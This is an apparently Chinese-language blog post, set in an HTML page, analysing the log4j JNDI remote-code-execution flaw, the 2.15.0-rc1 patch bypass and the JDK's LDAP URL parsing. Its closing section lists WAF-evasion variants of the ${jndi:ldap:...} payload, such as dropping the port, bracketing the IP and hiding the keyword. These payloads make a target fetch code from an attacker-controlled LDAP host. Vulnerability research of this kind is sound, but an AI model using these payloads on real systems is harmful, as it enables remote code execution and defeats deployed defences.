@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>如何跟踪log4j漏洞原理及发现绕WAF的tips - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">如何跟踪log4j漏洞原理及发现绕WAF的tips</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <blockquote> 
+ <p>log4j漏洞的形成原因已经有很多分析文章了，这里说一说我是如何在了解到有漏洞后，跟进漏洞产生原理的，以及发现的一些绕WAF tips</p> 
+</blockquote> 
+<h2>
+<a id="_2"></a>跟进漏洞产生原因的思路</h2> 
+<p><strong>如何发现漏洞产生原因的</strong></p> 
+<p>了解到log4j &lt;=2.14.1 存在RCE的情况，我马上跑到其官方github看了一下，发现commit记录中有两个关键commit<br> <img src="https://images2.imgbox.com/a5/97/vaesiR8O_o.png" alt="在这里插入图片描述"></p> 
+<ul>
+<li>第一，log4j不再自动对消息中的lookup进行格式化，第一时间看到不是很懂</li>
+<li>第二，限制JNDI默认支持，限制通过LDAP访问服务器和类</li>
+</ul> 
+<p>这两个点很容易联想到是不是跟JNDI攻击有关系，毕竟RMI和LDAP很容易做到RCE。跟进commit看看具体的修改情况，https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3 这个commit中，对org.apache.logging.log4j.core.net.JndiManager.java进行了大量修改，特别是在lookup方法中，加了很多代码</p> 
+<blockquote> 
+ <p><strong>【私信回复“资料”获取log4j的复现/修复教程】<a href="https://docs.qq.com/doc/DVExrc2JqUU1DWWd5">点击查看网络安全学习攻略</a></strong></p> 
+</blockquote> 
+<p><img src="https://images2.imgbox.com/c5/d2/3wrIMQvd_o.png" alt="在这里插入图片描述"><br> 仔细看了一下，没有修改前，lookup方法直接通过this.context.lookup(name)执行JNDI操作，没有任何过滤或者限制，而新增加的代码在限制JNDI服务器、类。当天晚上看到payload后，马上对log4j 2.14.1版本尝试验证一下，并在JndiManager#lookup方法中断点看到如下<br> <img src="https://images2.imgbox.com/d0/c0/HNckKxH7_o.png" alt="在这里插入图片描述"><br> 很明显，name就是payload中给定的，仔细看一下调用栈就可以发现，log4j会对字符串中的${}自动解析，也就是前面提到的commit备注信息中写到的。</p> 
+<p><strong>如何绕过2.15.0-rc1版本</strong></p> 
+<p>看到rc1版本存在绕过的消息，又来看看官方github仓库的commit记录，里面有一条在更新到2.15.0-rc1版本后的commit记录，提交的信息是"handle URI exception"，即处理了URI出错的情况。修改代码情况如下图<br> <img src="https://images2.imgbox.com/b9/a9/cPFn1z6w_o.png" alt="在这里插入图片描述"><br> JndiManager#lookup方法处给catch语句中添加了两行代码，记录URI解析错误并返回null。而添加这两行代码前，此处只有一行注释，因此catch报错后会继续向下执行this.context.lookup，也就意味着前面try语句中的代码报错后，会继续执行JNDI操作，绕过也就来自于这里。</p> 
+<p>来看看try语句是什么写的<br> <img src="https://images2.imgbox.com/25/10/ObAVoesG_o.png" alt="在这里插入图片描述"><br> 代码比较长没有完全截进来，关键点是进入lookup方法后，立即将name变量送入URI类的构造函数中，此时只要URI的构造函数对name字符串解析出错，即可跳转到catch语句，进而向下执行到JNDI操作。</p> 
+<p>那么我们要关注的点就是让new URI(name)处报错，但是name又能被jndi正常识别。好在我们用marshalsec构造ldap服务时，不需要关心uri长什么样，所以可以在uri上做文章。</p> 
+<p>跟踪源代码可以查看到URI对字符的支持情况<br> <img src="https://images2.imgbox.com/7c/e4/yLvl6Jfc_o.png" alt="在这里插入图片描述"><br> 数字、字母大小写这些就不说了，其它可打印字符也不多，从上面的注释中可以看到URI对反引号`，空格，尖括号&lt;&gt;并不支持，基于这一点，可以做个简单的实验<br> <img src="https://images2.imgbox.com/74/37/azFUXmA4_o.png" alt="在这里插入图片描述"><br> 空格和尖括号同样报错，就不重复截图了。回到前面提到的2.15.0-rc1版本对JndiManager#lookup方法的修复情况，并没有在catch语句中添加返回操作或报错，程序遇到报错后，会继续向下执行，从而造成危险。</p> 
+<p>由于找了很久都没有找到log4j-core-2.15.0-rc1.jar这个包，所以自己写了个函数模拟一下绕过的场景<br> <img src="https://images2.imgbox.com/ab/65/ffK5eKpR_o.png" alt="在这里插入图片描述"></p> 
+<h2>
+<a id="LDAPWAFtips_42"></a>LDAP绕WAF的tips</h2> 
+<p><strong>URI解析</strong></p> 
+<p>看完rc1版本的绕过后，又想了一下，防御工具可能会有针对性的做一些关键字检测，所以我打算从LDAP更深层的源代码看看有没有对字符串变形的可能性。</p> 
+<p>跟着this.context.lookup(name)处向下跟进到com.sun.jndi.url.ldap.LdapURLContextFactory#getUsingURLIgnoreRootDN方法，代码如下<br> <img src="https://images2.imgbox.com/e1/d3/16yF3xdR_o.png" alt="在这里插入图片描述"><br> 注意var0也就是输入是完整的"ldap://192.168.34.96:1389:/a"，而后var2可以使用getHost和getPort方法获取host和port，说明var2对象在创建时解析了ldap地址。跟进LdapURL类到达Uri#parse方法</p> 
+<ul><li>com.sun.jndi.toolkit.url.Uri#parse</li></ul> 
+<pre><code class="prism language-c">private <span class="token keyword">void</span> <span class="token function">parse</span><span class="token punctuation">(</span>String var1<span class="token punctuation">)</span> throws MalformedURLException <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">int</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        throw new <span class="token function">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Invalid URI: "</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span>scheme <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">++</span>var2<span class="token punctuation">;</span>
+        this<span class="token punctuation">.</span>hasAuthority <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> var3<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>this<span class="token punctuation">.</span>hasAuthority<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            var2 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+            var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+                var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">int</span> var4<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+                var4 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">93</span><span class="token punctuation">,</span> var2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> var4 <span class="token operator">&gt;</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+                    throw new <span class="token function">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Invalid URI: "</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                this<span class="token punctuation">.</span>host <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                var2 <span class="token operator">=</span> var4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+                var4 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">int</span> var5 <span class="token operator">=</span> var4 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> var4 <span class="token operator">&lt;=</span> var3 <span class="token operator">?</span> var4 <span class="token operator">:</span> var3<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">&lt;</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+                    this<span class="token punctuation">.</span>host <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                var2 <span class="token operator">=</span> var5<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> var3 <span class="token operator">&amp;&amp;</span> var1<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+                <span class="token operator">++</span>var2<span class="token punctuation">;</span>
+                this<span class="token punctuation">.</span>port <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            var2 <span class="token operator">=</span> var3<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            this<span class="token punctuation">.</span>path <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+            this<span class="token punctuation">.</span>path <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            this<span class="token punctuation">.</span>query <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>此时var1=“ldap://192.168.34.96:1389/a”</p> 
+<ul>
+<li>var2第一次赋值为(char)58也就是 : 在ldap中的索引，如果不存在 : 则直接报错</li>
+<li>this.scheme赋值为第1个字符到 : 之间的字符串，也就是ldap、ldaps</li>
+<li>var2第二次赋值自加1，而后检查冒号后是否存在//，如果不存在，则host和port都直接为null，进入path和query解析部分，也就是路径和参数</li>
+<li>第一个冒号后存在//，则进入if语句，var2第三次赋值，再加2，也就是跳过了//继续向后判断</li>
+<li>(char)47 也就是/，给var3=var1.indexOf("/",<br> var2)，实际上为://后第一个/的索引，这是用来找到host和port的一个定位，但很有可能后面没有/(即var1=“ldap://192.168.1.1:1389”，此时var3直接赋值为var1.length，也就是var1最大索引+1)</li>
+<li>再往下走，会先判断://和var3直接有没有 [ 和 ] 符号对，且 ]<br> 不能在var3后面否则会直接报错，这里有个意外情况就是ldap://[localhost:1389]/a这样写的话，会将localhost:1389当成host</li>
+<li>如果没有出现[]符号对，则赋值var4为://后的第一个：的索引，然后判断var4&gt;=0 且<br> var4&lt;=var3，也就是冒号:必须存在且在var3的前面，条件达成则赋值为var5=var4，否则var5=var3，即从://和:之间获取host，或者从://和/之间获取host。此时出现骚操作"ldap://localhost/:"，则host=localhost，骚操作"ldap://localhost"，则host=null</li>
+<li>继续往后走，如果正常在://和var3之间出现冒号，则可以截取出port，如果前面的骚操作"ldap://localhost/:"，则port为默认值-1，这个-1在后面大有可为：）</li>
+</ul> 
+<p>后面解析path和query的部分就不看了，回到com.sun.jndi.url.ldap.LdapURLContextFactory#getUsingURLIgnoreRootDN也就是上面那个图片的位置，此时host和port都解析好了，正式开启发起ldap请求</p> 
+<p><strong>LDAP发起</strong></p> 
+<p>com.sun.jndi.url.ldap.LdapURLContextFactory#getUsingURLIgnoreRootDN，执行到new LdapCtx("", var2.getHost(), var2.getPort(), var1, var2.useSsl())，即此时LdapURL已经解析完成，host和port都有了，跟进LdapCtx的构造方法，代码如下</p> 
+<pre><code class="prism language-c">public <span class="token function">LdapCtx</span><span class="token punctuation">(</span>String var1<span class="token punctuation">,</span> String var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var3<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">&gt;</span> var4<span class="token punctuation">,</span> boolean var5<span class="token punctuation">)</span> throws NamingException <span class="token punctuation">{<!-- --></span>
+    this<span class="token punctuation">.</span>useSsl <span class="token operator">=</span> this<span class="token punctuation">.</span>hasLdapsScheme <span class="token operator">=</span> var5<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span>envprops <span class="token operator">=</span> <span class="token punctuation">(</span>Hashtable<span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"ssl"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>this<span class="token punctuation">.</span>envprops<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.naming.security.protocol"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            this<span class="token punctuation">.</span>useSsl <span class="token operator">=</span> true<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        this<span class="token punctuation">.</span>trace <span class="token operator">=</span> <span class="token punctuation">(</span>OutputStream<span class="token punctuation">)</span>this<span class="token punctuation">.</span>envprops<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.trace.ber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.netscape.schemaBugs"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">||</span> var4<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.naming.netscape.schemaBugs"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            this<span class="token punctuation">.</span>netscapeSchemaBug <span class="token operator">=</span> true<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    this<span class="token punctuation">.</span>currentDN <span class="token operator">=</span> var1 <span class="token operator">!=</span> null <span class="token operator">?</span> var1 <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    this<span class="token punctuation">.</span>currentParsedDN <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>this<span class="token punctuation">.</span>currentDN<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    this<span class="token punctuation">.</span>hostname <span class="token operator">=</span> var2 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> var2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> var2 <span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span>hostname <span class="token operator">=</span> this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span>port_number <span class="token operator">=</span> var3<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span>port_number <span class="token operator">=</span> this<span class="token punctuation">.</span>useSsl <span class="token operator">?</span> <span class="token number">636</span> <span class="token operator">:</span> <span class="token number">389</span><span class="token punctuation">;</span>
+        this<span class="token punctuation">.</span>useDefaultPortNumber <span class="token operator">=</span> true<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    this<span class="token punctuation">.</span>schemaTrees <span class="token operator">=</span> new <span class="token function">Hashtable</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0.75F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    this<span class="token punctuation">.</span><span class="token function">initEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    try <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>false<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token function">catch</span> <span class="token punctuation">(</span>NamingException var9<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        try <span class="token punctuation">{<!-- --></span>
+            this<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token function">catch</span> <span class="token punctuation">(</span>Exception var8<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token punctuation">}</span>
+
+        throw var9<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>这里主要关注hostname和port_number两个参数，即下面的代码块</p> 
+<pre><code class="prism language-c">this<span class="token punctuation">.</span>hostname <span class="token operator">=</span> var2 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> var2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> var2 <span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    this<span class="token punctuation">.</span>hostname <span class="token operator">=</span> this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> this<span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    this<span class="token punctuation">.</span>port_number <span class="token operator">=</span> var3<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+    this<span class="token punctuation">.</span>port_number <span class="token operator">=</span> this<span class="token punctuation">.</span>useSsl <span class="token operator">?</span> <span class="token number">636</span> <span class="token operator">:</span> <span class="token number">389</span><span class="token punctuation">;</span>
+    this<span class="token punctuation">.</span>useDefaultPortNumber <span class="token operator">=</span> true<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>其中var2=LdapURL中解析的host，var3=LdapURL中解析的port</p> 
+<ul>
+<li>注意到代码逻辑，如果var2为null，则直接使this.hostname=“localhost”；</li>
+<li>如果hostname的第一个字符为"["，则取出第二个字符至倒数第二个字符的子字符串，即从[ip]，去掉[]，获得ip</li>
+<li>如果var3&lt;=0，即LdapURL解析port失败，则在使用ldaps时，端口改为636，使用ldap时，端口强制改为389</li>
+</ul> 
+<p>这些逻辑是变换ldap字符串的关键</p> 
+<p><strong>Bypass WAF tips</strong></p> 
+<p>根据前面LdapURL和LdapCtx的解析逻辑，可以对log4j的payload做出如下变换</p> 
+<ul><li><strong>不出现port，避免被waf匹配ip:port</strong></li></ul> 
+<pre><code class="prism language-c">$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span>a<span class="token punctuation">}</span>
+$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">:</span><span class="token operator">/</span>a<span class="token punctuation">}</span>
+注意此时需要ldap服务端口为<span class="token number">389</span>
+</code></pre> 
+<p><img src="https://images2.imgbox.com/a9/a0/0TkXno0L_o.png" alt="在这里插入图片描述"></p> 
+<ul><li><strong>对IP添加包裹</strong></li></ul> 
+<p>前面两个类的解析逻辑中都有对中括号[]的处理，所以给ip添加一下包裹</p> 
+<pre><code class="prism language-c">$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token comment">//[192.168.34.96]/a}</span>
+$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token comment">//[192.168.34.96]]/a} </span>
+LdapURL取出<span class="token string">"[ip]"</span>，LdapCtx去除<span class="token punctuation">[</span><span class="token punctuation">]</span>获得ip，两种情况下端口都是<span class="token number">389</span>
+</code></pre> 
+<ul><li>
+<strong>不出现ip和端口</strong>(有点鸡肋)</li></ul> 
+<pre><code class="prism language-c">$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span>a<span class="token punctuation">}</span>
+此时相当于ldap<span class="token operator">:</span><span class="token comment">//localhost:389/a</span>
+</code></pre> 
+<p>这种情况主要是来自于LdapURL解析URL时出错，导致host=null，port=-1，而后LdapCtx中发现host=null，则将host置为localhost，毕竟这样做看起来是可信的</p> 
+<p>原理是，LdapURL解析时有个关键处理如下</p> 
+<pre><code class="prism language-c">this<span class="token punctuation">.</span>hasAuthority <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// var2=第一个冒号的索引</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>hasAuthority<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+    解析获取host和port
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>此时不出现://这个整体，就可以直接跳出host和port的获取，而后在LdapCtx中对host=null时，赋值为localhost，对port=默认值-1时，赋值为389<br> <img src="https://images2.imgbox.com/23/42/B2SVr0Kx_o.png" alt="在这里插入图片描述"><br> 这个payload需要在目标上执行命令或其它方式开启ldap和文件下载服务，但都可以在目标上执行命令了，还需要这样干吗？所以有点鸡肋，除非java程序的权限比可以执行命令的用户权限更高，从而拿到更高权限(不过提权姿势也很多啊)</p> 
+<ul><li><strong>不出现jndi:ldap关键字</strong></li></ul> 
+<p>通过upperCase、fastjson的unicode编码等方法可以避免该关键字，具体就不重复写，直接引用浅蓝师傅的博客了https://b1ue.cn/archives/513.html ，</p> 
+<p>另外可以对log4j解析${}的部分深入了解一下，还能通过其自身特性，避免直接出现jndi:ldap关键字，但不是自己研究出来的就不公开了</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
